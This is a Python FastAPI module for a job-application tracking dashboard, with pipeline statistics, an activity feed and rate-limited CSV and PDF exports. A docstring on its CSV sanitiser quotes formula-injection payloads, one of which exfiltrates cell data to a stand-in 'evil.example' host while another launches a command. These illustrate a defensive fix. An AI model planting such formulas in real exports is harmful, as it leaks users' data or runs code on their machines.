"""Application tracking dashboard — one read that renders the whole page.

    GET /dashboard  -> pipeline stages, stats, application table, activity feed

Filters (company, role, status, campaign, since/until) apply to the table, the
funnel and the feed together, so the numbers on screen always describe the same
set of applications.
"""
from __future__ import annotations

import csv
import io
import logging
from datetime import UTC, datetime, timedelta
from statistics import median

from fastapi import APIRouter, Depends, HTTPException, Query, Response, status
from fastapi.responses import PlainTextResponse
from sqlalchemy import func, select
from sqlalchemy.orm import Session, selectinload

from app.core.database import get_db
from app.core.deps import get_current_user
from app.core.pagination import MAX_DB_INT, set_page_headers
from app.core.rate_limit import rate_limit
from app.core.sql_text import SEARCH_MAX_LENGTH, search_clause
from app.models.application import (
    CLOSED_STATUSES,
    ENGAGED_STATUSES,
    INTERVIEWING_STATUSES,
    Application,
    ApplicationStatus,
)
from app.models.campaign import Campaign
from app.models.email import Email, EmailDirection, EmailStatus
from app.models.email_thread import EmailThread
from app.models.fit_score import FitScore
from app.models.follow_up import FollowUp, FollowUpStatus
from app.models.job import JobPosting
from app.models.recruiter import Recruiter
from app.models.tailored_resume import TailoredResume
from app.models.user import User
from app.schemas.board import BoardColumn
from app.schemas.dashboard import (
    ActivityEvent,
    ApplicationRow,
    DashboardOut,
    DashboardStats,
    FilterOptions,
    PipelineStage,
)
from app.services import pipeline_board as board
from app.services import pipeline_export, reply_metrics

logger = logging.getLogger(__name__)
router = APIRouter(tags=["dashboard"])

# The funnel, in order. Each application sits in exactly one stage — the
# furthest it has reached — so the columns sum to the total rather than
# double-counting a thread that made it all the way to an interview.
#
# The two middle sets are *derived* from the frozensets the stats below are
# counted with, not restated beside them. Restated, they drifted: "Responded"
# listed only REPLIED and INTERESTED, so a recruiter who wrote back to decline
# left the application at NOT_INTERESTED — which `_stage_for` filed under
# "applied", while `stats.responded` counted it as a response because
# ENGAGED_STATUSES says a decline is still a human writing back. The page then
# showed "Responded: 14" in the stat row above a funnel column reading 9, from
# the same rows, and the funnel was the one that was wrong: a rejection is a
# reply, and a candidate whose replies are mostly rejections needs to see them
# in the funnel, not have them quietly returned to the top of it.
#
# Derived, the cumulative column at "responded" is exactly ENGAGED_STATUSES and
# the one at "interview" is exactly INTERVIEWING_STATUSES — see
# :func:`_build_pipeline` — so the two cannot disagree again without someone
# changing the shared sets, which changes both at once.
STAGES: list[tuple[str, str, set[ApplicationStatus]]] = [
    ("applied", "Applied", {ApplicationStatus.QUEUED, ApplicationStatus.OUTREACH_SENT}),
    ("viewed", "Followed up", {ApplicationStatus.FOLLOW_UP}),
    (
        "responded",
        "Responded",
        # Engaged, but no further than a reply — the ones that went on to a
        # scheduling conversation are counted in their own column below and
        # added back in by the cumulative sum.
        set(ENGAGED_STATUSES - INTERVIEWING_STATUSES),
    ),
    (
        "interview",
        "Interview",
        set(INTERVIEWING_STATUSES - {ApplicationStatus.OFFER}),
    ),
    ("offer", "Offer", {ApplicationStatus.OFFER}),
]

# Engaged / interviewing come from the model rather than being restated here.
# They used to be a local copy that predated ApplicationStatus.OFFER, so an
# application that reached an offer counted as neither a response nor an
# interview on this page while analytics counted it as both — the two pages
# disagreed about the same rows. See models/application.py for why they live
# there.
_ENGAGED = ENGAGED_STATUSES
_INTERVIEWING = INTERVIEWING_STATUSES
# What the page calls "rejected": a human said no, or the contact opted out.
# Narrower than `_INACTIVE`, which also covers outreach that simply died.
_CLOSED_LOST = {ApplicationStatus.NOT_INTERESTED, ApplicationStatus.UNSUBSCRIBED}
_INACTIVE = CLOSED_STATUSES


def _stage_for(status: ApplicationStatus) -> str:
    for key, _label, members in STAGES:
        if status in members:
            return key
    # Everything that ended without a reply (no response, opted out, closed by
    # the user) leaves the funnel but is still counted in the total — it entered
    # at "applied" and never got further. A *rejection* is not one of these: the
    # recruiter answered, so it belongs at "responded" and the sets above put it
    # there.
    return "applied"


def _aware(value: datetime | None) -> datetime | None:
    """SQLite hands back naive datetimes; the arithmetic below needs tz-aware."""
    if value is None:
        return None
    return value if value.tzinfo else value.replace(tzinfo=UTC)


@router.get("/dashboard", response_model=DashboardOut)
def dashboard(
    response: Response,
    db: Session = Depends(get_db),
    user: User = Depends(get_current_user),
    company: str | None = Query(default=None, max_length=SEARCH_MAX_LENGTH),
    role: str | None = Query(default=None, max_length=SEARCH_MAX_LENGTH),
    campaign_id: int | None = Query(default=None, ge=1, le=MAX_DB_INT),
    status_filter: ApplicationStatus | None = Query(default=None, alias="status"),
    days: int | None = Query(default=None, ge=1, le=730, description="Look back N days"),
    activity_limit: int = Query(default=40, ge=1, le=200),
    limit: int | None = Query(
        default=None,
        ge=1,
        le=200,
        description="Page size for `applications`; unset returns every row",
    ),
    offset: int = Query(default=0, ge=0, le=MAX_DB_INT),
) -> DashboardOut:
    """Everything the tracking dashboard renders, for one filtered slice."""
    since = datetime.now(UTC) - timedelta(days=days) if days else None

    stmt = (
        select(Application, Recruiter, Campaign)
        .join(Recruiter, Application.recruiter_id == Recruiter.id)
        .join(Campaign, Application.campaign_id == Campaign.id)
        .where(Application.user_id == user.id)
        .order_by(Application.updated_at.desc())
    )
    if campaign_id is not None:
        stmt = stmt.where(Application.campaign_id == campaign_id)
    if status_filter is not None:
        stmt = stmt.where(Application.status == status_filter)
    if (clause := search_clause(company, Recruiter.company)) is not None:
        stmt = stmt.where(clause)
    # Roles live on the campaign, as the target list the campaign runs on.
    if (clause := search_clause(role, Campaign.name)) is not None:
        stmt = stmt.where(clause)
    if since is not None:
        stmt = stmt.where(Application.created_at >= since)

    records = db.execute(stmt).all()
    application_ids = [a.id for a, _, _ in records]

    # One pass for the emails, one for the follow-ups, rather than a query per
    # row — the dashboard is the most-hit page in V2.
    threads_by_app: dict[int, list[EmailThread]] = {}
    follow_ups_by_app: dict[int, list[FollowUp]] = {}
    if application_ids:
        for thread in db.scalars(
            select(EmailThread)
            .where(EmailThread.application_id.in_(application_ids))
            .options(selectinload(EmailThread.emails))
        ):
            threads_by_app.setdefault(thread.application_id, []).append(thread)
        for follow_up in db.scalars(
            select(FollowUp).where(FollowUp.application_id.in_(application_ids))
        ):
            follow_ups_by_app.setdefault(follow_up.application_id, []).append(follow_up)

    rows: list[ApplicationRow] = []
    activity: list[ActivityEvent] = []
    stage_counts: dict[str, int] = {key: 0 for key, _, _ in STAGES}
    board_counts: dict[str, int] = {key: 0 for key, _, _, _ in board.BOARD_STAGES}
    reply_latencies: list[float] = []
    companies: set[str] = set()
    roles: set[str] = set()
    follow_ups_scheduled = follow_ups_sent = 0

    for application, recruiter, campaign in records:
        emails = [e for t in threads_by_app.get(application.id, []) for e in t.emails]
        outbound = [e for e in emails if e.direction == EmailDirection.SENT]
        inbound = [e for e in emails if e.direction == EmailDirection.RECEIVED]
        sent = [e for e in outbound if e.sent_at is not None]

        first_sent = _aware(min((e.sent_at for e in sent), default=None))
        # The row's own column is the *newest* reply — "when did this thread
        # last hear back", which is what a table sorted by it should answer.
        # The latency below is a different question and takes the first reply;
        # see :func:`reply_metrics.reply_latency_days`.
        replied_at = _aware(max((e.sent_at for e in inbound if e.sent_at), default=None))
        latency = reply_metrics.reply_latency_days(emails)
        if latency is not None:
            reply_latencies.append(latency)

        follow_ups = follow_ups_by_app.get(application.id, [])
        pending = [f for f in follow_ups if f.status == FollowUpStatus.SCHEDULED]
        follow_ups_scheduled += len(pending)

        # Which steps actually went out, keyed off the message rather than off
        # `FollowUp.status` — that status reads SENT the moment the step is
        # actioned, and a step whose email was parked for review is actioned but
        # not sent. The same `sent_at is not None` test the outreach count above
        # uses, so both numbers on the page mean the same thing by "sent".
        emails_by_id = {e.id: e for e in emails}
        follow_up_emails = {
            f.id: emails_by_id[f.email_id]
            for f in follow_ups
            if f.email_id is not None and f.email_id in emails_by_id
        }
        delivered = [
            f
            for f in follow_ups
            if f.id in follow_up_emails and follow_up_emails[f.id].sent_at is not None
        ]
        follow_ups_sent += len(delivered)

        stage = _stage_for(application.status)
        stage_counts[stage] += 1
        # The board's own grouping, which is not the funnel's: the funnel asks
        # how far an application got, the board asks what the user should do
        # with it next, so "rejected" is a column on one and nowhere on the
        # other. Computed here so the client never has to know that twelve
        # statuses collapse to five columns — that map has exactly one owner.
        board_stage = board.stage_for(application.status)
        board_counts[board_stage] += 1

        role_label = (campaign.target_roles or [None])[0]
        if recruiter.company:
            companies.add(recruiter.company)
        if role_label:
            roles.add(role_label)

        last_activity = _aware(application.updated_at)
        rows.append(
            ApplicationRow(
                application_id=application.id,
                campaign_id=campaign.id,
                campaign_name=campaign.name,
                company=recruiter.company,
                role=role_label,
                contact=recruiter.name or recruiter.email,
                status=application.status,
                stage=stage,
                board_stage=board_stage,
                board_locked=board.is_locked(application.status),
                first_sent_at=first_sent,
                last_activity_at=last_activity,
                replied_at=replied_at,
                message_count=len(emails),
                follow_ups_scheduled=len(pending),
                next_follow_up_at=_aware(
                    min((f.scheduled_at for f in pending), default=None)
                ),
            )
        )

        # ---- Timeline ----
        # A follow-up's message is an outbound email on the same thread, so
        # without this it earns two entries for one send: an `outreach_sent` here
        # and a `follow_up_sent` below. The feed then shows a three-step sequence
        # as five events and reads as more contact than the recruiter got.
        follow_up_email_ids = {
            f.email_id for f in follow_ups if f.email_id is not None
        }
        for email in sent:
            if email.id in follow_up_email_ids:
                continue
            activity.append(
                ActivityEvent(
                    at=_aware(email.sent_at),
                    kind="outreach_sent",
                    application_id=application.id,
                    company=recruiter.company,
                    role=role_label,
                    contact=recruiter.email,
                    summary=email.subject,
                    status=application.status,
                )
            )
        for email in inbound:
            if email.sent_at:
                activity.append(
                    ActivityEvent(
                        at=_aware(email.sent_at),
                        kind="reply_received",
                        application_id=application.id,
                        company=recruiter.company,
                        role=role_label,
                        contact=recruiter.email,
                        summary=(email.body_text or "")[:180] or email.subject,
                        status=application.status,
                    )
                )
        for follow_up in delivered:
            activity.append(
                ActivityEvent(
                    at=_aware(follow_up_emails[follow_up.id].sent_at),
                    kind="follow_up_sent",
                    application_id=application.id,
                    company=recruiter.company,
                    role=role_label,
                    contact=recruiter.email,
                    summary=(
                        f"Follow-up {follow_up.step} "
                        f"({follow_up.template.value.lower().replace('_', ' ')})"
                    ),
                    status=application.status,
                )
            )

    total = len(rows)
    engaged = sum(1 for r in rows if r.status in _ENGAGED)
    interviews = sum(1 for r in rows if r.status in _INTERVIEWING)
    offers = sum(1 for r in rows if r.status == ApplicationStatus.OFFER)
    rejected = sum(1 for r in rows if r.status in _CLOSED_LOST)
    active = sum(1 for r in rows if r.status not in _INACTIVE)

    pipeline = _build_pipeline(stage_counts, total)
    stats = DashboardStats(
        total_applications=total,
        active=active,
        responded=engaged,
        interviews=interviews,
        offers=offers,
        rejected=rejected,
        response_rate=round(engaged / total, 3) if total else 0.0,
        interview_rate=round(interviews / total, 3) if total else 0.0,
        offer_rate=round(offers / total, 3) if total else 0.0,
        follow_ups_scheduled=follow_ups_scheduled,
        follow_ups_sent=follow_ups_sent,
        median_days_to_reply=round(median(reply_latencies), 1) if reply_latencies else None,
        **_smart_apply_stats(db, user),
    )

    activity.sort(key=lambda e: e.at, reverse=True)
    if limit is None:
        page, has_more = rows, False
    else:
        page = rows[offset : offset + limit]
        has_more = offset + limit < total
    # `total` here is the filtered application count — the same number
    # `X-Total-Count` means on every other list. The export endpoints below call
    # this function directly rather than over HTTP and pass a throwaway
    # `Response`, so the headers cost them nothing.
    set_page_headers(
        response, total=total, returned=len(page), offset=offset if limit else 0
    )

    return DashboardOut(
        stats=stats,
        pipeline=pipeline,
        board=[
            BoardColumn(key=key, label=label, count=board_counts[key])
            for key, label, _statuses, _drop in board.BOARD_STAGES
        ],
        applications=page,
        has_more=has_more,
        activity=activity[:activity_limit],
        filters=FilterOptions(
            companies=sorted(companies),
            roles=sorted(roles),
            campaigns=[
                {"id": c.id, "name": c.name}
                for c in db.scalars(
                    select(Campaign)
                    .where(Campaign.user_id == user.id)
                    .order_by(Campaign.id.desc())
                )
            ],
            statuses=[s.value for s in ApplicationStatus],
        ),
    )


def _build_pipeline(stage_counts: dict[str, int], total: int) -> list[PipelineStage]:
    """Cumulative funnel: each stage counts everything that reached it or beyond.

    A thread at "interview" also passed through "applied", so the columns
    decrease left to right the way a funnel should, instead of showing an empty
    "applied" bucket once everything has moved on.

    Each stage also carries its conversion *from the step before it*, which is
    the number the funnel's shape was always trying to communicate and never
    quite did. The bar widths are all shares of the total, so once outreach
    volume is in the hundreds every column past the first is a sliver and the
    eye cannot tell a stage that loses 90% from one that loses 40%. Reading the
    cliff off two widths is arithmetic the user should not be doing.

    Deliberately *not* crowned with a "bottleneck" badge. In job search the
    applied-to-responded step is the worst one on almost every account — a 5-10%
    response rate is the normal state of the world, not a diagnosis — so a badge
    that lands there for everyone, every week, is a constant wearing a finding's
    clothes. The per-step numbers vary and are worth reading; which of them is
    lowest is not.
    """
    order = [key for key, _, _ in STAGES]
    out: list[PipelineStage] = []
    previous: int | None = None
    for index, (key, label, _members) in enumerate(STAGES):
        reached = sum(stage_counts.get(k, 0) for k in order[index:])
        out.append(
            PipelineStage(
                key=key,
                label=label,
                count=reached,
                rate=round(reached / total, 3) if total else 0.0,
                # Guarded on ``previous`` being truthy as well as not None: an
                # empty stage divides into nothing, and 0/0 is not 0% — it is a
                # question nobody asked, so the stage reports no conversion at
                # all rather than a flat bar reading "0% converted".
                conversion=(
                    round(reached / previous, 3) if previous else None
                ),
                drop_off=max((previous or 0) - reached, 0) if previous else 0,
            )
        )
        previous = reached
    return out


def _smart_apply_stats(db: Session, user: User) -> dict:
    """Counters for the V2 features, shown alongside the outreach funnel."""
    tailored = db.scalar(
        select(func.count(TailoredResume.id)).where(TailoredResume.user_id == user.id)
    )
    jobs = db.scalar(
        select(func.count(JobPosting.id)).where(JobPosting.user_id == user.id)
    )
    average_fit = db.scalar(
        select(func.avg(FitScore.overall)).where(FitScore.user_id == user.id)
    )
    return {
        "tailored_resumes": tailored or 0,
        "jobs_tracked": jobs or 0,
        "average_fit_score": round(float(average_fit), 1) if average_fit is not None else None,
    }


CSV_COLUMNS = [
    "application_id",
    "company",
    "role",
    "contact",
    "status",
    "stage",
    "campaign",
    "first_sent_at",
    "replied_at",
    "last_activity_at",
    "messages",
    "follow_ups_scheduled",
    "next_follow_up_at",
]


# Characters that make a spreadsheet read a cell as code. `=`, `+`, `-` and `@`
# are the operators; TAB and CR are on the list for the opposite reason — the
# readers *strip* them and evaluate what follows, so `\t=1+1` is a formula too.
#
# That last pair is also why "prefix a tab" is not a fix, tempting as it looks:
# it produces exactly the string this list exists to catch.
_FORMULA_LEADERS = ("=", "+", "-", "@", "\t", "\r")


def _defuse(text: str) -> str:
    """Neutralise a cell a spreadsheet would otherwise execute.

    CSV is a text format; ``=1+1`` is the string ``=1+1``. Excel, LibreOffice
    and Sheets all disagree, and evaluate a leading formula character on open.
    That turns this export into code execution on the machine of the person who
    downloaded it, and the payload does not have to be anything they typed —
    most of what is in these columns arrives from outside::

        company / contact  <- the discovery crawl, off a third party's page
        contact            <- the From: name on inbound recruiter mail
        role / campaign    <- the user's own text

    So a recruiter who writes to this candidate under the display name
    ``=HYPERLINK("https://evil.example/?c="&A1,"Open")`` gets a live link out of
    the candidate's own pipeline export, carrying whatever cell it points at.
    ``=cmd|'/c calc'!A1`` is the same hole with a worse ending.

    The leading apostrophe is the standard mitigation and the one with the best
    behaviour on the reader that matters: Excel and LibreOffice both take it as
    "this cell is text", do not display it, and do not evaluate what follows.
    The cost is that a reader treating CSV as CSV — pandas, ``csv``, a database
    import — sees the apostrophe as data. That is the trade, and it is the right
    way round: a visible stray character in a column of names is a cosmetic
    problem, and the alternative is arbitrary code.
    """
    # Leading whitespace is stripped before the check, for exactly the reason
    # TAB and CR are in the list above: the readers strip it and evaluate what
    # follows. That argument covers a plain space too, and a plain space was not
    # on the list — so `" =HYPERLINK(...)"` went through untouched while
    # `"\t=HYPERLINK(...)"` was caught, which is the same payload with a cheaper
    # prefix. The apostrophe still goes on the front of the original text, so a
    # cell that legitimately begins with spaces keeps them.
    if text.lstrip().startswith(_FORMULA_LEADERS) or text.startswith(_FORMULA_LEADERS):
        return "'" + text
    return text


def _csv_cell(value) -> str:
    """Render one value for CSV. Datetimes go out as ISO-8601, blanks as ''.

    Anything textual goes through :func:`_defuse` — see there for why a CSV
    export of third-party data is a code-execution surface.
    """
    if value is None:
        return ""
    if isinstance(value, datetime):
        return value.isoformat()
    if isinstance(value, ApplicationStatus):
        return value.value
    # Numbers and enums are rendered by us and cannot lead with a formula
    # character; only free text can, and only free text is worth touching.
    if isinstance(value, str):
        return _defuse(value)
    return str(value)


@router.get(
    "/dashboard/export.csv",
    response_class=PlainTextResponse,
    # The same budget the PDF beside it draws on, and the reason that one has a
    # budget at all: both call :func:`dashboard` with ``limit=None``, so both
    # read every application under the filters and every message on each of
    # them, holding a connection out of a pool sized to the request threadpool
    # from the first row to the last.
    #
    # Only the PDF carried the limiter, and its own comment already said the two
    # shared one — so the sentence was true of the intent and false of the app.
    # An unmetered route doing the identical work is not a smaller hole than a
    # missing limit, it is the *same* hole with a limiter drawn beside it: ten
    # PDFs an hour is the cap, and the eleventh scan is one GET away under a
    # different extension. Metered together, alternating formats spends one
    # budget, which is what the PDF's comment claimed all along.
    dependencies=[Depends(rate_limit(10, 3600, scope="pipeline-export"))],
)
def export_csv(
    db: Session = Depends(get_db),
    user: User = Depends(get_current_user),
    company: str | None = Query(default=None, max_length=SEARCH_MAX_LENGTH),
    role: str | None = Query(default=None, max_length=SEARCH_MAX_LENGTH),
    campaign_id: int | None = Query(default=None, ge=1, le=MAX_DB_INT),
    status_filter: ApplicationStatus | None = Query(default=None, alias="status"),
    days: int | None = Query(default=None, ge=1, le=730),
) -> PlainTextResponse:
    """The pipeline table as CSV, honouring the same filters as the page.

    Deliberately routed through :func:`dashboard` rather than re-querying: an
    export that disagreed with the table it was downloaded from would be worse
    than no export at all.
    """
    data = dashboard(
        # A throwaway: `dashboard` sets this export's page headers on it and
        # nothing reads them. The export is unpaged (`limit=None`) by design.
        response=Response(),
        db=db,
        user=user,
        company=company,
        role=role,
        campaign_id=campaign_id,
        status_filter=status_filter,
        days=days,
        activity_limit=1,
        limit=None,
        offset=0,
    )

    buffer = io.StringIO()
    writer = csv.writer(buffer)
    writer.writerow(CSV_COLUMNS)
    for row in data.applications:
        writer.writerow(
            [
                _csv_cell(value)
                for value in (
                    row.application_id,
                    row.company,
                    row.role,
                    row.contact,
                    row.status,
                    row.stage,
                    row.campaign_name,
                    row.first_sent_at,
                    row.replied_at,
                    row.last_activity_at,
                    row.message_count,
                    row.follow_ups_scheduled,
                    row.next_follow_up_at,
                )
            ]
        )

    stamp = datetime.now(UTC).strftime("%Y-%m-%d")
    return PlainTextResponse(
        buffer.getvalue(),
        media_type="text/csv; charset=utf-8",
        headers={
            "Content-Disposition": f'attachment; filename="talentping-pipeline-{stamp}.csv"'
        },
    )


@router.get(
    "/dashboard/report.pdf",
    # Not costly per call in the way the LLM routes are — costly per *account*.
    # It reads every application under the filters and every message on each of
    # them, then renders, and it holds a database connection from the first row
    # to the last out of a pool sized to the request threadpool. The CSV beside
    # it does the same work; they share one budget deliberately, because metered
    # apart a caller alternates formats and gets twice the scans over one set of
    # rows.
    dependencies=[Depends(rate_limit(10, 3600, scope="pipeline-export"))],
)
def export_report_pdf(
    db: Session = Depends(get_db),
    user: User = Depends(get_current_user),
    company: str | None = Query(default=None, max_length=SEARCH_MAX_LENGTH),
    role: str | None = Query(default=None, max_length=SEARCH_MAX_LENGTH),
    campaign_id: int | None = Query(default=None, ge=1, le=MAX_DB_INT),
    status_filter: ApplicationStatus | None = Query(default=None, alias="status"),
    days: int | None = Query(default=None, ge=1, le=730),
) -> Response:
    """A one-page report of the pipeline, honouring the same filters as the page.

    Routed through :func:`dashboard` for the same reason :func:`export_csv` is,
    and it matters more here: this file and that one are downloaded from the
    same toolbar, minutes apart, and two exports of the same pipeline that
    disagree is worse than either being missing.

    The report truncates its table and says so on the page; the totals always
    describe the whole filtered set. See
    :mod:`app.services.pipeline_export`.

    409 rather than 500 without reportlab, matching the tailored-resume
    download: "this deployment cannot render PDFs" is a state, not a fault, and
    the client offers the CSV instead.
    """
    if not pipeline_export.pdf_available():
        raise HTTPException(
            status.HTTP_409_CONFLICT,
            "PDF rendering is not available on this deployment. Export the CSV instead.",
        )

    data = dashboard(
        # A throwaway: `dashboard` sets this export's page headers on it and
        # nothing reads them. The export is unpaged (`limit=None`) by design.
        response=Response(),
        db=db,
        user=user,
        company=company,
        role=role,
        campaign_id=campaign_id,
        status_filter=status_filter,
        days=days,
        activity_limit=1,
        limit=None,
        offset=0,
    )
    now = datetime.now(UTC)
    return Response(
        content=pipeline_export.render_pdf(user, data.applications, now=now),
        media_type="application/pdf",
        headers={
            "Content-Disposition": (
                f'attachment; filename="{pipeline_export.filename(now=now)}"'
            ),
            # What the report *covers*, which is not what it lists. A client
            # showing "40 rows" beside a file whose totals describe 400 would be
            # repeating the exact lie the page's own footnote exists to prevent.
            "X-Total-Count": str(len(data.applications)),
        },
    )


@router.get("/dashboard/queue", response_model=dict)
def dashboard_queue(
    db: Session = Depends(get_db), user: User = Depends(get_current_user)
) -> dict:
    """What the automation is about to do — upcoming follow-ups and pending sends.

    Separate from the main read because it changes on a different clock: the
    dashboard is a report, this is a live queue the user may want to poll.
    """
    upcoming = db.scalars(
        select(FollowUp)
        .join(Application, FollowUp.application_id == Application.id)
        .where(
            Application.user_id == user.id,
            FollowUp.status == FollowUpStatus.SCHEDULED,
        )
        .order_by(FollowUp.scheduled_at)
        .limit(20)
    ).all()

    pending_sends = db.scalar(
        select(func.count(Email.id))
        .join(EmailThread, Email.thread_id == EmailThread.id)
        .join(Application, EmailThread.application_id == Application.id)
        .where(
            Application.user_id == user.id,
            Email.direction == EmailDirection.SENT,
            Email.status.in_([EmailStatus.QUEUED, EmailStatus.DRAFT]),
        )
    )

    return {
        "pending_sends": pending_sends or 0,
        "follow_ups": [
            {
                "id": f.id,
                "application_id": f.application_id,
                "step": f.step,
                "template": f.template.value,
                "scheduled_at": _aware(f.scheduled_at),
            }
            for f in upcoming
        ],
    }
